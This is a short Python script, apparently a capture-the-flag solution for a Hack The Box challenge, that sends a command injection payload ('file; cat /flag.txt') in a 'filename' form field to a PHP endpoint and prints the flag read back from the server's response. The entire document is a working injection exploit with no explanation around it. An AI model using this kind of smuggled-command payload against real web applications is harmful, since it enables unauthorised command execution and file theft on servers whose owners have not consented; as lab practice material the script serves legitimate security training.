import requests
import re

url = "http://161.35.173.232:30844/index.php"

session = requests.Session()

params = {
	"filename": "file; cat /flag.txt"
}

r1 = session.post(url, data=params)
answer = re.findall(r'HTB{(.*)}', r1.text)
print("HTB{" + answer[0] + "}")